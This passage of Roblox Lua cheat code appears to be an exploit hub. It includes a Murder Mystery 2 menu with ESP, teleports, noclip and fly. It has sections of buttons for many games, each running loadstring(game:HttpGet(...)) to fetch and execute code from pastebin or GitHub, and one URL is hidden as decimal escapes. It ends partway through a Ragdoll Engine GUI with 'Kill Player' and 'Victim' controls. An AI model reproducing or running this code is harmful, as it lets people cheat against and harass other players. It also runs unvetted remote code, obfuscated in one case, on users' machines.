            hidden = true;
            pez:hide();
        end
	end
end

function togglevisuals()
    if (showvisuals) then
        showvisuals = false;
        pez:hideTab("visuals");
    else
        showvisuals =true;
        pez:showTab("visuals");
    end
end

function toggleespsettings()
    if (showespsettings) then
        showespsettings = false;
        pez:hideTab("espsettings");
    else
        showespsettings =true;
        pez:showTab("espsettings");
    end
end

function toggleitems()
    if (showitems) then
        showitems = false;
        pez:hideTab("items");
    else
        showitems =true;
        pez:showTab("items");
    end
end

function togglemovement()
    if (showmovement) then
        showmovement = false;
        pez:hideTab("movement");
    else
        showmovement =true;
        pez:showTab("movement");
    end
end

function toggleenableds()
    if (showenableds) then
        showenableds = false;
        pez:hideTab("cheats");
    else
        showenableds =true;
        pez:showTab("cheats");
    end
end

function toggleplayerlist()
    if (showplayerlist) then
        showplayerlist = false;
        pez:hideTab("playerlist");
    else
        showplayerlist =true;
        pez:showTab("playerlist");
    end
end
 
game:GetService("UserInputService").InputBegan:connect(onKeyPress)

pez:addTab("gui","Gui");
pez:addLabel("gui","info","Toggle gui: Home")
pez:addButton("gui","Visuals",togglevisuals)
pez:addButton("gui","Esp settings",toggleespsettings)
pez:addButton("gui","Items",toggleitems)
pez:addButton("gui","Movement",togglemovement)
pez:addButton("gui","Enabled cheats",toggleenableds)
pez:addButton("gui","Playerlist",toggleplayerlist)

pez:addTab("visuals","Visuals");
pez:addButton("visuals","ESP",toggleesp)
pez:addButton("visuals","FOV",togglefov)
pez:addButton("visuals","Set night",setnight)
pez:addButton("visuals","Set day",setday)

pez:addTab("espsettings","Esp settings");
pez:addButton("espsettings","Show murderer",toggleespmurderer)
pez:addButton("espsettings","Show sheriff",toggleespsheriff)
pez:addButton("espsettings","Show innocents",toggleespinnocent)
pez:addButton("espsettings","Show dropped gun",toggleespgun);

pez:addTab("items","Items");
pez:addButton("items","Tp coins",toggletpcoins)
pez:addButton("items","Tp gun",toggletpgun)

pez:addTab("movement","Movement");
pez:addButton("movement","Noclip",togglenoclip)
pez:addButton("movement","Fly",togglefly)
pez:addButton("movement","Fast",togglefast)
pez:addButton("movement","Highjump",togglejump)
pez:addButton("movement","Tp to lobby",tplobby)

pez:addTab("playerlist","Playerlist")

pez:addTab("credits","Credits");
pez:addLabel("credits","nikoo","niko#1809")

print("press Home to toggle the gui");
print("mm2 script by niko#1809 / lekolar2 ;)")

local cor = coroutine.wrap(function()
    while(true) do
        wait(1)
        for i,v in pairs(game.Players:GetPlayers()) do
            if (v.Character) then
                if (pez:itemExists("playerlist",v.Name)) then
                    pez:removeLabel("playerlist",v.Name)
                end

                local team = checkTeam(v);

                if (team == 1) then
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(255,0,0))
                elseif (team == 2) then
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(0,0,255))
                else
                    pez:addColoredLabel("playerlist",v.Name,v.Name,Color3.new(0,255,0))
                end
            end
        end
    end
end)

cor();

x = 0;

while(true)do
    if (x == 200) then pez:removeTab("credits"); else x = x + 1; end
    wait();
    if (fovon) then
        local cam = workspace.CurrentCamera;
        cam.FieldOfView = 100;
    else
        local cam = workspace.CurrentCamera;
        cam.FieldOfView = 70;
    end
    if (tpcoins) then
        for i,v in pairs(workspace:GetChildren()) do
            if (v:FindFirstChild("CoinContainer")) then
                for w,g in pairs(v.CoinContainer:GetChildren()) do
                    g.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
                end
            end
        end
    end
    if (tpgun) then
        if (workspace:FindFirstChild("GunDrop")) then
            workspace.GunDrop.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        end
    end
    if (espon) then
        if (espgun) then
            if (workspace:FindFirstChild("GunDrop")) then
                if (workspace.GunDrop:FindFirstChild("nikohead")) then
                    workspace.GunDrop.nikohead:Destroy()
                end
                makedot(workspace.GunDrop);
            end
        end
        for i,v in pairs(game.Players:GetPlayers()) do
            if (v.Character) then
                if (v.Character:WaitForChild("HumanoidRootPart")) then
                    if (v~=game.Players.LocalPlayer) then
                        if (v.Character:WaitForChild("HumanoidRootPart"):FindFirstChild("yoniko")) then
                            v.Character:WaitForChild("HumanoidRootPart").yoniko:Destroy()
                        end
                        local team = checkTeam(v)

                        if (team == 1) then
                            if (espmurderer) then makebox(v.Character.HumanoidRootPart,Color3.new(255,0,0)); end
                        elseif (team == 2) then
                            if (espsheriff) then makebox(v.Character.HumanoidRootPart,Color3.new(0,0,255)); end
                        else
                            if (espinnocent) then makebox(v.Character.HumanoidRootPart,Color3.new(0,255,0)); end
                        end
                    end
                end
            end
        end
    end
end
end)

Section:NewButton("MM2 GUI 10", "This is new", function()
loadstring(game:HttpGet('https://pastebin.com/raw/DihfjHj2'))()
end)




local Section = Tab:NewSection("Tower Of Hell")

Section:NewButton("ToH Admin", "Its only admin command", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TwomadJR/nto/main/admiin"))()
end)

Section:NewButton("ToH GUI 1", "So Op for TOH", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/BbVHjH56'))()
end)

Section:NewButton("ToH Gui 2", "ButtonInfo", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/garfield%20hub", true))()
end)

Section:NewButton("ToH Gui 3", "ButtonInfo", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/03koios/TowerOfHell/main/README.md"))()
end)

Section:NewButton("ToH Gui 4", "ButtonInfo", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/iiProductionz/Floater-Scripts/main/WaifuEdition/Tower%20Of%20Hell"))()
end)



local Section = Tab:NewSection("Arsenal")

Section:NewButton("Darkrai X", "Arsenal", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/arsenal-hub/main/Arsenal%20GamingScripter", true))()
end)

Section:NewButton("Arsenal 1", "Arsenal 2", function()
   loadstring(game:HttpGet("https://pastebin.com/raw/xq7q0XPq"))()
end)

Section:NewButton("Arsenal 2(New)", "Our script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/UltimateCromaSin-Arsenal-Gui/main/Arsenal"))()
end)

Section:NewButton("Arsenal 3(New)", "New and Op then mine lol", function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/Maikderninja/Maikderninja/main/PWNERHUB.lua"), true))()
end)


local Section = Tab:NewSection("Da Hood")

Section:NewButton("Da Hood GUI 1", "DA HOOD is kinda good", function()
   loadstring(game:HttpGet('https://pastebin.com/raw/ZCiS8jSd'))()
end)

Section:NewButton("DaHood GUI 2", "New GUI", function()
   loadstring(game:HttpGet(("https://raw.githubusercontent.com/SoftVortex/.../main/....."),true))()
end)

Section:NewButton("Da Hood GUI 3", "DaHood Evil", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Impulseonyoutube/scripts/main/dahood"))()
end)

Section:NewButton("Da Hood GUI 4", "DaHood Evil", function()
   loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\71\97\109\101\114\69\109\105\108\105\97\110\111\70\70\47\116\114\105\112\95\47\109\97\105\110\47\72\117\98\10",true))()
end)

Section:NewButton("Da Hood Gui 5", "Dahood idk", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Impulseonyoutube/scripts/main/dahood"))()
end)

Section:NewButton("Da Hood GodMode", "You Will be god", function()
p = game.Players.LocalPlayer
ch = p.Character

ch.BodyEffects.Dead:Destroy()
end)

Section:NewButton("DaHood Silent Aim", "ButtonInfo", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Impulseonyoutube/scripts/main/dahood"))()
end)

Section:NewButton("DaHood Gui 6(New and Op)", "So many scripts lol", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
end)

Section:NewButton("DaHood Gui 7(New)", "Gay im jk", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BalligusapoTT/BalligusapoTT/main/UntitledhoodGui"))()
end)



local Section = Tab:NewSection("Blox Fruit")

Section:NewButton("BloxFruit GUI 1", "One piece", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Lazerxl/overlazerxkaito-nahee/main/README.md"))()
end)

Section:NewButton("BloxFruit GUI 2", "One piece", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/joi-droid/MaruHubBF/main/GOHANSSJ3'))()
end)

Section:NewButton("BloxFruit 3", "New i guess", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/NinoGod/NetnaYay/8d21ce23346c500c93bb8b4a71f7791e4058a70b/startload.lua'))()
end)

Section:NewButton("BloxFruit 4", "New i guess", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/SHAREHACK/bloxfruit/main/free'))()
end)

Section:NewButton("BloxFruit 5", "New", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GooD1020/GooD1020/main/README.md'))()
end)



local Section = Tab:NewSection("King Leagcy")

Section:NewButton("KingLegacy GUI 1", "KingLegacy 1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThunderZ-05/HUB/main/Script"))()
end)

Section:NewButton("KingLegacy GUI 2", "KingLegacy 2", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/SHAREHACK/script/main/kl'))()
end)

Section:NewButton("KingLegacy GUI 3", "KingLegacy 3", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI%27'))()
end)

Section:NewButton("KingLegacy GUI 4", "KingLegacy 4", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hajibeza/RIPPER-HUB/main/King%20Leagacy"))()
end)



local Section = Tab:NewSection("Anime Fighter")

Section:NewButton("AnimeFighter GUI 1", "AnimeFighter 1", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/DookDekDEE/AFS/main/script.lua"))()
end)






local Section = Tab:NewSection("Ragdoll Engine(Deleted)")

Section:NewButton("Ragdoll Engine GUI 1", "Gives you a OP gui", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/martinelcrac/cryptonichub/main/Ragdollengine.lua'))()
end)

Section:NewButton("Ragdoll Engine Gui 2", "Gives op Gui", function()
local Gui = Instance.new("ScreenGui")
local OpenFrame = Instance.new("Frame")
local OpenColorBar = Instance.new("Frame")
local Open = Instance.new("TextButton")
local MainFrame = Instance.new("Frame")
local MenuFrame = Instance.new("Frame")
local VipServer = Instance.new("TextButton")
local Back = Instance.new("TextButton")
local MainPage = Instance.new("TextButton")
local FunctionsPage = Instance.new("TextButton")
local TeleportsPage = Instance.new("TextButton")
local Exit = Instance.new("TextButton")
local Hide = Instance.new("TextButton")
local MainColorBar = Instance.new("Frame")
local MainContent = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Credits = Instance.new("TextLabel")
local FunctionsContent = Instance.new("Frame")
local WalkSpeed = Instance.new("TextButton")
local JumpPower = Instance.new("TextButton")
local SpamTools = Instance.new("TextButton")
local Gravity = Instance.new("TextButton")
local KillPlayer = Instance.new("TextButton")
local TpToPlayer = Instance.new("TextButton")
local Spin = Instance.new("TextButton")
local AltDelete = Instance.new("TextButton")
local NoRagdoll = Instance.new("TextButton")
local Noclip = Instance.new("TextButton")
local Victim = Instance.new("TextBox")
local TeleportsContent = Instance.new("Frame")
local TpSign = Instance.new("TextButton")
local TpEscalatorTop = Instance.new("TextButton")
local TpEscalatorBottom = Instance.new("TextButton")
local TpBuildingTop = Instance.new("TextButton")
local TpBuildingMiddle = Instance.new("TextButton")
local TpBuildingBin = Instance.new("TextButton")
local TpTempleStaircase = Instance.new("TextButton")
local TpSpiralStaircase = Instance.new("TextButton")
local TpEdge = Instance.new("TextButton")
local TpCannonRange = Instance.new("TextButton")
local TpPool = Instance.new("TextButton")
local TpBalloon = Instance.new("TextButton")
local speeding = true
local highjumping = true
local mooneffect = true
local phase = false
local visual = false
local P = game:GetService("Players").LocalPlayer.Character
local W = game:GetService("Workspace")
local deleting = false
local play = game:GetService("Players").LocalPlayer
local dollstopper = false
local spammer = false
Gui.Name = "Gui"
Gui.Parent = game.CoreGui
Gui.ResetOnSpawn = true
OpenFrame.Name = "OpenFrame"
OpenFrame.Parent = Gui
OpenFrame.Active = true
OpenFrame.BackgroundColor3 = Color3.new(0, 0, 0)
OpenFrame.BackgroundTransparency = 0.30000001192093
OpenFrame.BorderColor3 = Color3.new(0, 0, 0)
OpenFrame.BorderSizePixel = 0
OpenFrame.Position = UDim2.new(0, 0, 0.5, 0)
OpenFrame.Size = UDim2.new(0, 196, 0, 48)
OpenFrame.Visible = false
OpenColorBar.Name = "OpenColorBar"
OpenColorBar.Parent = OpenFrame
OpenColorBar.Active = true
OpenColorBar.BackgroundColor3 = Color3.new(1, 0, 0)
OpenColorBar.BorderColor3 = Color3.new(0, 0, 0)
OpenColorBar.BorderSizePixel = 0
OpenColorBar.Position = UDim2.new(0.00510204071, 0, 0.9375, 0)
OpenColorBar.Size = UDim2.new(0, 195, 0, 3)
Open.Name = "Open"
Open.Parent = OpenFrame
Open.BackgroundColor3 = Color3.new(0, 0, 0)
Open.BackgroundTransparency = 1
Open.BorderColor3 = Color3.new(0, 0, 0)
Open.BorderSizePixel = 0
Open.Position = UDim2.new(0.00510204071, 0, 0, 0)
Open.Size = UDim2.new(0, 162, 0, 45)
Open.Font = Enum.Font.SourceSansLight
Open.Text = "Open"
Open.TextColor3 = Color3.new(1, 1, 1)
Open.TextSize = 32
MainFrame.Name = "MainFrame"
MainFrame.Parent = Gui
MainFrame.Active = true
MainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
MainFrame.BackgroundTransparency = 0.30000001192093
MainFrame.BorderColor3 = Color3.new(0, 0, 0)
MainFrame.BorderSizePixel = 0
MainFrame.ClipsDescendants = true
MainFrame.Position = UDim2.new(0.328729272, 0, 0.36053133, 0)
MainFrame.Size = UDim2.new(0, 372, 0, 192)
MenuFrame.Name = "MenuFrame"
MenuFrame.Parent = MainFrame
MenuFrame.Active = true
MenuFrame.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
MenuFrame.BorderColor3 = Color3.new(0, 0, 0)
MenuFrame.BorderSizePixel = 0
MenuFrame.Position = UDim2.new(-0.851999998, 0, 0, 0)
MenuFrame.Size = UDim2.new(0, 372, 0, 191)
MenuFrame.ZIndex = 2
VipServer.Name = "VipServer"
VipServer.Parent = MenuFrame
VipServer.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
VipServer.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
VipServer.Position = UDim2.new(0.0349462368, 0, 0.0942408368, 0)
VipServer.Size = UDim2.new(0, 95, 0, 33)
VipServer.ZIndex = 3
VipServer.Font = Enum.Font.SourceSansLight
VipServer.Text = "Vip Server"
VipServer.TextColor3 = Color3.new(1, 1, 1)
VipServer.TextSize = 22
Back.Name = "Back"
Back.Parent = MenuFrame
Back.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Back.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
Back.Position = UDim2.new(0.327956975, 0, 0.0942408368, 0)
Back.Size = UDim2.new(0, 75, 0, 33)
Back.ZIndex = 3
Back.Font = Enum.Font.SourceSansLight
Back.Text = "<-- Back"
Back.TextColor3 = Color3.new(1, 1, 1)
Back.TextSize = 22
MainPage.Name = "MainPage"
MainPage.Parent = MenuFrame
MainPage.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
MainPage.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
MainPage.Position = UDim2.new(0.0349462368, 0, 0.314136118, 0)
MainPage.Size = UDim2.new(0, 301, 0, 33)
MainPage.ZIndex = 3
MainPage.Font = Enum.Font.SourceSansLight
MainPage.Text = "Main Page"
MainPage.TextColor3 = Color3.new(1, 1, 1)
MainPage.TextSize = 22
FunctionsPage.Name = "FunctionsPage"
FunctionsPage.Parent = MenuFrame
FunctionsPage.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
FunctionsPage.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
FunctionsPage.Position = UDim2.new(0.0322580636, 0, 0.759162307, 0)
FunctionsPage.Size = UDim2.new(0, 302, 0, 33)
FunctionsPage.ZIndex = 3
FunctionsPage.Font = Enum.Font.SourceSansLight
FunctionsPage.Text = "Functions Page"
FunctionsPage.TextColor3 = Color3.new(1, 1, 1)
FunctionsPage.TextSize = 22
TeleportsPage.Name = "TeleportsPage"
TeleportsPage.Parent = MenuFrame
TeleportsPage.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TeleportsPage.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
TeleportsPage.Position = UDim2.new(0.0322580636, 0, 0.539267004, 0)
TeleportsPage.Size = UDim2.new(0, 302, 0, 33)
TeleportsPage.ZIndex = 3
TeleportsPage.Font = Enum.Font.SourceSansLight
TeleportsPage.Text = "Teleports Page"
TeleportsPage.TextColor3 = Color3.new(1, 1, 1)
TeleportsPage.TextSize = 22
Exit.Name = "Exit"
Exit.Parent = MenuFrame
Exit.BackgroundColor3 = Color3.new(0.666667, 0.156863, 0.156863)
Exit.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
Exit.Position = UDim2.new(0.717741907, 0, 0.0942408368, 0)
Exit.Size = UDim2.new(0, 47, 0, 33)
Exit.ZIndex = 3
Exit.Font = Enum.Font.SourceSansLight
Exit.Text = "Exit"
Exit.TextColor3 = Color3.new(1, 1, 1)
Exit.TextSize = 22
Hide.Name = "Hide"
Hide.Parent = MenuFrame
Hide.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
Hide.BorderColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
Hide.Position = UDim2.new(0.556451619, 0, 0.0942408368, 0)
Hide.Size = UDim2.new(0, 47, 0, 33)
Hide.ZIndex = 3
Hide.Font = Enum.Font.SourceSansLight
Hide.Text = "Hide"
Hide.TextColor3 = Color3.new(1, 1, 1)
Hide.TextSize = 22
MainColorBar.Name = "MainColorBar"
MainColorBar.Parent = MainFrame
MainColorBar.Active = true
MainColorBar.BackgroundColor3 = Color3.new(1, 0, 0)
MainColorBar.BorderColor3 = Color3.new(0, 0, 0)
MainColorBar.BorderSizePixel = 0
MainColorBar.Size = UDim2.new(0, 372, 0, 3)
MainColorBar.ZIndex = 3
MainContent.Name = "MainContent"
MainContent.Parent = MainFrame
MainContent.Active = true
MainContent.BackgroundColor3 = Color3.new(0, 0, 0)
MainContent.BackgroundTransparency = 1
MainContent.BorderColor3 = Color3.new(0, 0, 0)
MainContent.BorderSizePixel = 0
MainContent.Position = UDim2.new(0.17473118, 0, 0.0520833321, 0)
MainContent.Size = UDim2.new(0, 298, 0, 174)
Title.Name = "Title"
Title.Parent = MainContent
Title.Active = true
Title.BackgroundColor3 = Color3.new(0, 0, 0)
Title.BackgroundTransparency = 1
Title.BorderColor3 = Color3.new(0, 0, 0)
Title.BorderSizePixel = 0
Title.Size = UDim2.new(0, 298, 0, 41)
Title.Font = Enum.Font.SourceSansLight
Title.Text = "Ragdoll Engine U"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 32
Credits.Name = "Credits"
Credits.Parent = MainContent
Credits.Active = true
Credits.BackgroundColor3 = Color3.new(0, 0, 0)
Credits.BackgroundTransparency = 1
Credits.BorderColor3 = Color3.new(0, 0, 0)
Credits.BorderSizePixel = 0
Credits.Position = UDim2.new(0, 0, 0.333333343, 0)
Credits.Size = UDim2.new(0, 298, 0, 116)
Credits.Font = Enum.Font.SourceSansLight
Credits.Text = "-- This gui was made by Lz0x#1510 on discord                                                            -- Hover over the grey tab to use."
Credits.TextColor3 = Color3.new(1, 1, 1)
Credits.TextSize = 22
Credits.TextWrapped = true
Credits.TextXAlignment = Enum.TextXAlignment.Left
Credits.TextYAlignment = Enum.TextYAlignment.Top
FunctionsContent.Name = "FunctionsContent"
FunctionsContent.Parent = MainFrame
FunctionsContent.Active = true
FunctionsContent.BackgroundColor3 = Color3.new(0, 0, 0)
FunctionsContent.BackgroundTransparency = 1
FunctionsContent.BorderColor3 = Color3.new(0, 0, 0)
FunctionsContent.BorderSizePixel = 0
FunctionsContent.Position = UDim2.new(0.174999997, 0, 0.0520000011, 0)
FunctionsContent.Size = UDim2.new(0, 298, 0, 174)
FunctionsContent.Visible = false
WalkSpeed.Name = "WalkSpeed"
WalkSpeed.Parent = FunctionsContent
WalkSpeed.BackgroundColor3 = Color3.new(0, 0, 0)
WalkSpeed.BackgroundTransparency = 0.69999998807907
WalkSpeed.BorderColor3 = Color3.new(0, 0, 0)
WalkSpeed.BorderSizePixel = 0
WalkSpeed.Size = UDim2.new(0, 141, 0, 22)
WalkSpeed.Font = Enum.Font.SourceSansLight
WalkSpeed.Text = "WalkSpeed - Off"
WalkSpeed.TextColor3 = Color3.new(1, 1, 1)
WalkSpeed.TextSize = 22
JumpPower.Name = "JumpPower"
JumpPower.Parent = FunctionsContent
JumpPower.BackgroundColor3 = Color3.new(0, 0, 0)
JumpPower.BackgroundTransparency = 0.69999998807907
JumpPower.BorderColor3 = Color3.new(0, 0, 0)
JumpPower.BorderSizePixel = 0
JumpPower.Position = UDim2.new(0, 0, 0.160919547, 0)
JumpPower.Size = UDim2.new(0, 141, 0, 22)
JumpPower.Font = Enum.Font.SourceSansLight
JumpPower.Text = "JumpPower - Off"
JumpPower.TextColor3 = Color3.new(1, 1, 1)
JumpPower.TextSize = 22
SpamTools.Name = "SpamTools"
SpamTools.Parent = FunctionsContent
SpamTools.BackgroundColor3 = Color3.new(0, 0, 0)
SpamTools.BackgroundTransparency = 0.69999998807907
SpamTools.BorderColor3 = Color3.new(0, 0, 0)
SpamTools.BorderSizePixel = 0
SpamTools.Position = UDim2.new(0, 0, 0.482758641, 0)
SpamTools.Size = UDim2.new(0, 141, 0, 22)
SpamTools.Font = Enum.Font.SourceSansLight
SpamTools.Text = "Spam Tools"
SpamTools.TextColor3 = Color3.new(1, 1, 1)
SpamTools.TextSize = 22
Gravity.Name = "Gravity"
Gravity.Parent = FunctionsContent
Gravity.BackgroundColor3 = Color3.new(0, 0, 0)
Gravity.BackgroundTransparency = 0.69999998807907
Gravity.BorderColor3 = Color3.new(0, 0, 0)
Gravity.BorderSizePixel = 0
Gravity.Position = UDim2.new(0, 0, 0.321839094, 0)
Gravity.Size = UDim2.new(0, 141, 0, 22)
Gravity.Font = Enum.Font.SourceSansLight
Gravity.Text = "Gravity - Off"
Gravity.TextColor3 = Color3.new(1, 1, 1)
Gravity.TextSize = 22
KillPlayer.Name = "KillPlayer"
KillPlayer.Parent = FunctionsContent
KillPlayer.BackgroundColor3 = Color3.new(0, 0, 0)
KillPlayer.BackgroundTransparency = 0.69999998807907
KillPlayer.BorderColor3 = Color3.new(0, 0, 0)
KillPlayer.BorderSizePixel = 0
KillPlayer.Position = UDim2.new(0, 0, 0.643678188, 0)
KillPlayer.Size = UDim2.new(0, 141, 0, 22)
KillPlayer.Font = Enum.Font.SourceSansLight
KillPlayer.Text = "Kill Player"
KillPlayer.TextColor3 = Color3.new(1, 1, 1)
KillPlayer.TextSize = 22
TpToPlayer.Name = "TpToPlayer"
TpToPlayer.Parent = FunctionsContent
TpToPlayer.BackgroundColor3 = Color3.new(0, 0, 0)
TpToPlayer.BackgroundTransparency = 0.69999998807907
TpToPlayer.BorderColor3 = Color3.new(0, 0, 0)
TpToPlayer.BorderSizePixel = 0
TpToPlayer.Position = UDim2.new(0.526845634, 0, 0.643678188, 0)
TpToPlayer.Size = UDim2.new(0, 141, 0, 22)
TpToPlayer.Font = Enum.Font.SourceSansLight
TpToPlayer.Text = "Tp To Player"
TpToPlayer.TextColor3 = Color3.new(1, 1, 1)
TpToPlayer.TextSize = 22
Spin.Name = "Spin"
Spin.Parent = FunctionsContent
Spin.BackgroundColor3 = Color3.new(0, 0, 0)
Spin.BackgroundTransparency = 0.69999998807907
Spin.BorderColor3 = Color3.new(0, 0, 0)
Spin.BorderSizePixel = 0
Spin.Position = UDim2.new(0.526845634, 0, 0.482758641, 0)
Spin.Size = UDim2.new(0, 141, 0, 22)
Spin.Font = Enum.Font.SourceSansLight
Spin.Text = "Spin"
Spin.TextColor3 = Color3.new(1, 1, 1)
Spin.TextSize = 22
AltDelete.Name = "Alt Delete"
AltDelete.Parent = FunctionsContent
AltDelete.BackgroundColor3 = Color3.new(0, 0, 0)
AltDelete.BackgroundTransparency = 0.69999998807907
AltDelete.BorderColor3 = Color3.new(0, 0, 0)
AltDelete.BorderSizePixel = 0
AltDelete.Position = UDim2.new(0.526845634, 0, 0.321839094, 0)
AltDelete.Size = UDim2.new(0, 141, 0, 22)
AltDelete.Font = Enum.Font.SourceSansLight
AltDelete.Text = "Alt Delete"
AltDelete.TextColor3 = Color3.new(1, 1, 1)
AltDelete.TextSize = 22
NoRagdoll.Name = "No Ragdoll"
NoRagdoll.Parent = FunctionsContent
NoRagdoll.BackgroundColor3 = Color3.new(0, 0, 0)
NoRagdoll.BackgroundTransparency = 0.69999998807907
NoRagdoll.BorderColor3 = Color3.new(0, 0, 0)
NoRagdoll.BorderSizePixel = 0
NoRagdoll.Position = UDim2.new(0.526845634, 0, 0.160919547, 0)
NoRagdoll.Size = UDim2.new(0, 141, 0, 22)
NoRagdoll.Font = Enum.Font.SourceSansLight
NoRagdoll.Text = "No Ragdoll"
NoRagdoll.TextColor3 = Color3.new(1, 1, 1)
NoRagdoll.TextSize = 22
Noclip.Name = "Noclip"
Noclip.Parent = FunctionsContent
Noclip.BackgroundColor3 = Color3.new(0, 0, 0)
Noclip.BackgroundTransparency = 0.69999998807907
Noclip.BorderColor3 = Color3.new(0, 0, 0)
Noclip.BorderSizePixel = 0
Noclip.Position = UDim2.new(0.526845634, 0, 0, 0)
Noclip.Size = UDim2.new(0, 141, 0, 22)
Noclip.Font = Enum.Font.SourceSansLight
Noclip.Text = "Noclip - Off"
Noclip.TextColor3 = Color3.new(1, 1, 1)
Noclip.TextSize = 22
Victim.Name = "Victim"
Victim.Parent = FunctionsContent
Victim.BackgroundColor3 = Color3.new(0, 0, 0)
Victim.BackgroundTransparency = 0.69999998807907
Victim.BorderColor3 = Color3.new(0, 0, 0)
Victim.BorderSizePixel = 0
Victim.Position = UDim2.new(0, 0, 0.816091955, 0)
Victim.Size = UDim2.new(0, 298, 0, 22)
Victim.Font = Enum.Font.SourceSansLight
Victim.PlaceholderColor3 = Color3.new(1, 1, 1)
Victim.PlaceholderText = "Victim"
Victim.Text = ""
Victim.TextColor3 = Color3.new(1, 1, 1)
Victim.TextSize = 22
TeleportsContent.Name = "TeleportsContent"
TeleportsContent.Parent = MainFrame
TeleportsContent.Active = true
TeleportsContent.BackgroundColor3 = Color3.new(0, 0, 0)
TeleportsContent.BackgroundTransparency = 1
TeleportsContent.BorderColor3 = Color3.new(0, 0, 0)
TeleportsContent.BorderSizePixel = 0
TeleportsContent.Position = UDim2.new(0.174999997, 0, 0.0520000011, 0)
TeleportsContent.Size = UDim2.new(0, 298, 0, 174)
TeleportsContent.Visible = false
TpSign.Name = "TpSign"
TpSign.Parent = TeleportsContent
TpSign.BackgroundColor3 = Color3.new(0, 0, 0)
TpSign.BackgroundTransparency = 0.69999998807907
TpSign.BorderColor3 = Color3.new(0, 0, 0)
TpSign.BorderSizePixel = 0
TpSign.Size = UDim2.new(0, 142, 0, 23)
TpSign.Font = Enum.Font.SourceSansLight
TpSign.Text = "Sign"
TpSign.TextColor3 = Color3.new(1, 1, 1)
TpSign.TextSize = 22
TpEscalatorTop.Name = "TpEscalatorTop"
TpEscalatorTop.Parent = TeleportsContent
TpEscalatorTop.BackgroundColor3 = Color3.new(0, 0, 0)
TpEscalatorTop.BackgroundTransparency = 0.69999998807907
TpEscalatorTop.BorderColor3 = Color3.new(0, 0, 0)
TpEscalatorTop.BorderSizePixel = 0
TpEscalatorTop.Position = UDim2.new(0, 0, 0.166666672, 0)
TpEscalatorTop.Size = UDim2.new(0, 142, 0, 23)
TpEscalatorTop.Font = Enum.Font.SourceSansLight
TpEscalatorTop.Text = "Escalator Top"
TpEscalatorTop.TextColor3 = Color3.new(1, 1, 1)
TpEscalatorTop.TextSize = 22
TpEscalatorBottom.Name = "TpEscalatorBottom"
TpEscalatorBottom.Parent = TeleportsContent
TpEscalatorBottom.BackgroundColor3 = Color3.new(0, 0, 0)
TpEscalatorBottom.BackgroundTransparency = 0.69999998807907
TpEscalatorBottom.BorderColor3 = Color3.new(0, 0, 0)
TpEscalatorBottom.BorderSizePixel = 0
TpEscalatorBottom.Position = UDim2.new(0, 0, 0.333333343, 0)
TpEscalatorBottom.Size = UDim2.new(0, 142, 0, 23)
TpEscalatorBottom.Font = Enum.Font.SourceSansLight
TpEscalatorBottom.Text = "Escalator Bottom"
TpEscalatorBottom.TextColor3 = Color3.new(1, 1, 1)
TpEscalatorBottom.TextSize = 22
TpBuildingTop.Name = "TpBuildingTop"
TpBuildingTop.Parent = TeleportsContent
TpBuildingTop.BackgroundColor3 = Color3.new(0, 0, 0)
TpBuildingTop.BackgroundTransparency = 0.69999998807907
TpBuildingTop.BorderColor3 = Color3.new(0, 0, 0)
TpBuildingTop.BorderSizePixel = 0
TpBuildingTop.Position = UDim2.new(0, 0, 0.5, 0)
TpBuildingTop.Size = UDim2.new(0, 142, 0, 23)
TpBuildingTop.Font = Enum.Font.SourceSansLight
TpBuildingTop.Text = "Building Top"
TpBuildingTop.TextColor3 = Color3.new(1, 1, 1)
TpBuildingTop.TextSize = 22
TpBuildingMiddle.Name = "TpBuildingMiddle"
TpBuildingMiddle.Parent = TeleportsContent
